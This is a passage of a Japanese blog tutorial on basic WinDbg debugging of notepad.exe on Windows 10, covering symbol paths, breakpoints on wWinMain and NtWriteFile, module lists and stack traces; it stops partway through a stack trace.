&lt;ul&gt;
&lt;li&gt;Windows10 20H2&lt;/li&gt;
&lt;li&gt;WinDbg 10.0.22000.1 AMD64（管理者権限で起動）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;notepadexeの起動&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#notepadexe%E3%81%AE%E8%B5%B7%E5%8B%95&quot; aria-label=&quot;notepadexeの起動 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Notepad.exeの起動&lt;/h3&gt;
&lt;p&gt;Windows環境でWinDbgを起動した後、[Ctrl+E]キーで[Open Executable File]を呼び出し、&lt;code class=&quot;language-text&quot;&gt;C:\Windows\System32\notepad.exe&lt;/code&gt;を選択します。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;image-20211002113631533.png&quot; alt=&quot;image-20211002113631533&quot;&gt;&lt;/p&gt;
&lt;p&gt;実行ファイルを開くと、Commandウィンドウが起動しました。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;image-20211002113723502.png&quot; alt=&quot;image-20211002113723502&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;シンボルパスの設定と読み込み&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B7%E3%83%B3%E3%83%9C%E3%83%AB%E3%83%91%E3%82%B9%E3%81%AE%E8%A8%AD%E5%AE%9A%E3%81%A8%E8%AA%AD%E3%81%BF%E8%BE%BC%E3%81%BF&quot; aria-label=&quot;シンボルパスの設定と読み込み permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;シンボルパスの設定と読み込み&lt;/h3&gt;
&lt;p&gt;Commandウィンドウの下部にあるコンソールに、以下のコマンドを入力します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sympath srv*&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;.sympath&lt;/code&gt;コマンドは、シンボルパスを設定するコマンドです。
シンボルパスとは、デバッガがシンボルファイルを探す際の探索先を意味します。&lt;/p&gt;
&lt;p&gt;シンボルファイルは、デバッガがコード モジュール (関数名、変数名など) に関する情報を取得するために必要です。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/-sympath--set-symbol-path-&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;.sympath (シンボル パスの設定) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;シンボルパスの設定が完了したので、以下のコマンドを実行します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reload&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;.reload&lt;/code&gt;コマンドによって、シンボル情報を削除した後、再読み込みします。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/-reload--reload-module-&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;.reload (モジュールの再読み込み) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;.reload&lt;/code&gt;コマンドを実行しても、特にレスポンスはない点に注意が必要です。
以下の出力が得られたら次に進みます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;0:000&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reload
Reloading current modules
&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;シンボル一覧の出力&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B7%E3%83%B3%E3%83%9C%E3%83%AB%E4%B8%80%E8%A6%A7%E3%81%AE%E5%87%BA%E5%8A%9B&quot; aria-label=&quot;シンボル一覧の出力 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;シンボル一覧の出力&lt;/h3&gt;
&lt;p&gt;上記の出力確認後に、&lt;code class=&quot;language-text&quot;&gt;x notepad!*&lt;/code&gt;コマンドを実行して&lt;code class=&quot;language-text&quot;&gt;Notepad.exe&lt;/code&gt;モジュールのシンボルを表示します。
※ ここで出力が得られない場合は&lt;code class=&quot;language-text&quot;&gt;.reload&lt;/code&gt;コマンドを再実行します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/x--examine-symbols-&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;x notepad!*&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;出力結果は1500行近い数になりました。
かなり多いですね。&lt;/p&gt;
&lt;h3 id=&quot;ブレークポイントの設定&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%96%E3%83%AC%E3%83%BC%E3%82%AF%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%81%AE%E8%A8%AD%E5%AE%9A&quot; aria-label=&quot;ブレークポイントの設定 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ブレークポイントの設定&lt;/h3&gt;
&lt;p&gt;次に、上記の出力で確認したシンボル情報を用いて、wWinMain関数にブレークポイントを設定します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;bu notepad!wWinMain&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;特に出力は返ってきませんが、&lt;code class=&quot;language-text&quot;&gt;bl&lt;/code&gt;コマンドでブレークポイントの一覧を参照できます。
参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/bl--breakpoint-list-&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;bl (ブレークポイントの一覧) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;これで、&lt;code class=&quot;language-text&quot;&gt;notepad!wWinMain&lt;/code&gt;にブレークポイントが設定されたことが確認できました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;0:000&gt; bu notepad!wWinMain
0:000&gt; bl
     0 e Disable Clear  00007ff6`8402c0f8     0001 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0001&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;  0:&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; notepad!wWinMain&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;notepadexeを実行する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#notepadexe%E3%82%92%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B&quot; aria-label=&quot;notepadexeを実行する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Notepad.exeを実行する&lt;/h3&gt;
&lt;p&gt;ブレークポイントの設定が完了したので、&lt;code class=&quot;language-text&quot;&gt;g&lt;/code&gt;コマンドで起動しているアプリケーションを実行します。
参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/g--go-&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;g (実行) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ブレークポイントで設定されたwWinMain関数の呼び出し時点で停止しました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;0:000&gt; g
ModLoad: 00007ff9`9cd70000 00007ff9`9cda0000   C:\WINDOWS\System32\IMM32&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;DLL
Breakpoint 0 hit
notepad!wWinMain:
00007ff6`8402c0f8 488bc4          mov     rax&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;rsp&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;プロセスに読み込まれているコードモジュールの一覧を表示する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E3%81%AB%E8%AA%AD%E3%81%BF%E8%BE%BC%E3%81%BE%E3%82%8C%E3%81%A6%E3%81%84%E3%82%8B%E3%82%B3%E3%83%BC%E3%83%89%E3%83%A2%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E3%81%AE%E4%B8%80%E8%A6%A7%E3%82%92%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B&quot; aria-label=&quot;プロセスに読み込まれているコードモジュールの一覧を表示する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;プロセスに読み込まれているコードモジュールの一覧を表示する&lt;/h3&gt;
&lt;p&gt;ブレークポイントでプロセスが停止した状態で&lt;code class=&quot;language-text&quot;&gt;lm&lt;/code&gt;コマンドを実行し、現在プロセスに読み込まれているコードモジュールを確認します。
参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/lm--list-loaded-modules-&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;lm (読み込まれたモジュールの一覧表示) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;0:000&gt; lm
&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;             &lt;span class=&quot;token keyword&quot;&gt;end&lt;/span&gt;                 module name
00007ff6`84020000 00007ff6`8405a000   notepad    &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pdb symbols&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;          C:\Program Files &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;\Windows Kits\10\Debuggers\x64\sym\notepad&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pdb\6539CE998C7CAFD73A8E13A54542E1121\notepad&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pdb
00007ff9`8ef30000 00007ff9`8f1ca000   COMCTL32   &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;deferred&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;             
00007ff9`982c0000 00007ff9`98350000   apphelp    &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;deferred&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;             
00007ff9`9aa40000 00007ff9`9aadd000   msvcp_win   &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;deferred&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;             
00007ff9`9ab90000 00007ff9`9ae59000   KERNELBASE   &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;deferred&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;             
00007ff9`9aec0000 00007ff9`9afc0000   ucrtbase   &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;deferred&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;             
00007ff9`9b010000 00007ff9`9b11b000   gdi32full   &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;deferred&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;             
00007ff9`9b340000 00007ff9`9b362000   win32u     &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;deferred&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;             
00007ff9`9bbc0000 00007ff9`9bcea000   RPCRT4     &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;deferred&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;             
00007ff9`9bf20000 00007ff9`9c275000   combase    &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;deferred&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;             
00007ff9`9c3c0000 00007ff9`9c46e000   shcore     &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;deferred&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;             
00007ff9`9cc50000 00007ff9`9cd0e000   KERNEL32   &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;deferred&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;             
00007ff9`9cd70000 00007ff9`9cda0000   IMM32      &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;deferred&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;             
00007ff9`9cfd0000 00007ff9`9cffb000   GDI32      &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;deferred&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;             
00007ff9`9d000000 00007ff9`9d1a1000   USER32     &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;deferred&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;             
00007ff9`9d1b0000 00007ff9`9d24e000   msvcrt     &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;deferred&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;             
00007ff9`9d290000 00007ff9`9d485000   ntdll      &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pdb symbols&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;          C:\Program Files &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;\Windows Kits\10\Debuggers\x64\sym\ntdll&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pdb\E2BF5EA3ECAA1D5310F1E166306A0BCC1\ntdll&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pdb&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;スタックトレースを表示する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B9%E3%82%92%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B&quot; aria-label=&quot;スタックトレースを表示する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;スタックトレースを表示する&lt;/h3&gt;
&lt;p&gt;プロセスが停止した状態で&lt;code class=&quot;language-text&quot;&gt;k&lt;/code&gt;コマンドを実行して、スタックトレースを表示します。&lt;/p&gt;
&lt;p&gt;今回は&lt;code class=&quot;language-text&quot;&gt;notepad!wWinMain&lt;/code&gt;で停止したタイミングでのスタックトレースを取得できました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;0:000&gt; k
 &lt;span class=&quot;token comment&quot;&gt;# Child-SP          RetAddr               Call Site&lt;/span&gt;
00 00000055`5f11f7b8 00007ff6`840459b6     notepad!wWinMain
01 00000055`5f11f7c0 00007ff9`9cc67034     notepad!__scrt_common_main_seh+0x106
02 00000055`5f11f800 00007ff9`9d2e2651     KERNEL32!BaseThreadInitThunk+0x14
03 00000055`5f11f830 00000000`00000000     ntdll!RtlUserThreadStart+0x21&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;notepadexeを再開する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#notepadexe%E3%82%92%E5%86%8D%E9%96%8B%E3%81%99%E3%82%8B&quot; aria-label=&quot;notepadexeを再開する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Notepad.exeを再開する&lt;/h3&gt;
&lt;p&gt;もう一度&lt;code class=&quot;language-text&quot;&gt;g&lt;/code&gt;コマンドを実行すると、中断されていたプロセスが再開され、メモ帳アプリが起動しました。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;image-20211003210626408.png&quot; alt=&quot;image-20211003210626408&quot;&gt;&lt;/p&gt;
&lt;p&gt;この状態では、デバッガはBusy状態となり、追加のコマンド入力を受け付けなくなります。&lt;/p&gt;
&lt;p&gt;再びメモ帳プロセスを停止してデバッガを使用するために、Breakボタンか、[Ctrl+Break]キーを押します。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;image-20211003211015461.png&quot; alt=&quot;image-20211003211015461&quot;&gt;&lt;/p&gt;
&lt;p&gt;これで再度メモ帳プロセスが停止され、デバッガ操作が可能になりました。&lt;/p&gt;
&lt;h3 id=&quot;ファイル書き込み時にプロセスを停止する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E6%9B%B8%E3%81%8D%E8%BE%BC%E3%81%BF%E6%99%82%E3%81%AB%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E3%82%92%E5%81%9C%E6%AD%A2%E3%81%99%E3%82%8B&quot; aria-label=&quot;ファイル書き込み時にプロセスを停止する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ファイル書き込み時にプロセスを停止する&lt;/h3&gt;
&lt;p&gt;続いて、&lt;code class=&quot;language-text&quot;&gt;bu ntdll!ZwWriteFile&lt;/code&gt;を実行して、ファイル書き込み時にプロセスを中断するためのブレークポイントを設定します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;0:002&gt; bu ntdll!ZwWriteFile
0:002&gt; bl
     0 e Disable Clear  00007ff6`8402c0f8     0001 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0001&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;  0:&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; notepad!wWinMain
     1 e Disable Clear  00007ff9`9d32ce60     0001 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0001&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;  0:&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; ntdll!NtWriteFile&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;再び&lt;code class=&quot;language-text&quot;&gt;g&lt;/code&gt;コマンドを入力してプロセスを再開したのち、メモ帳に書き込み保存を実行しようとすると、プロセスが停止されます。&lt;/p&gt;
&lt;p&gt;このタイミングでスタックトレースを表示すると、書き込み時のスタックトレースを取得することができます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;0:011&gt; k
 &lt;span class=&quot;token comment&quot;&gt;# Child-SP          RetAddr               Call Site&lt;/span&gt;
00 00000055`5f8fdb78 00007ff9`9bc1f6f4     ntdll!NtWriteFile
